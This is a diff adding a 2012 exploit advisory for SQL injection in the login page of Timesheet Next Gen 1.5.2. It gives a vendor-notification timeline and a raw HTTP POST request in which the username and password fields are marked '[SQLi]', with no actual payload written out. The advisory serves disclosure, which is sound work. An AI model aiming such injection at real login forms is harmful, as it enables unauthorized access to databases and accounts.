@@ -1,0 +1,40 @@
+# Exploit Title: Timesheet Next Gen 1.5.2 Multiple SQLi
+# Date: 02/23/12
+# Author: G13
+# Software Link: https://sourceforge.net/projects/tsheetx/
+# Version: 1.5.2
+# Category: webapps (php)
+#
+
+##### Vulnerability #####
+
+The login.php page has multiple SQL injection vulnerabilities. Both
+the 'username' and 'password'
+parameters are vulnerable to SQL Injection.
+
+The vulnerability exists via the POST method.
+
+##### Vendor Notification #####
+
+02/23/12 - Vendor Notified
+02/26/12 - Email sent to each developer, developer responds
+02/29/12 - Confirmation by developer requested
+03/02/12 - Disclosure
+
+##### Exploit #####
+
+http://localhost/timesheet/
+
+POST /timesheet/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:10.0.2)
+Gecko/20100101 Firefox/10.0.2
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://localhost/timesheet/login.php
+Cookie: PHPSESSID=3b624f789e37fa3bdade432da
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+redirect=&username=[SQLi]&password=[SQLi]&Login=submit
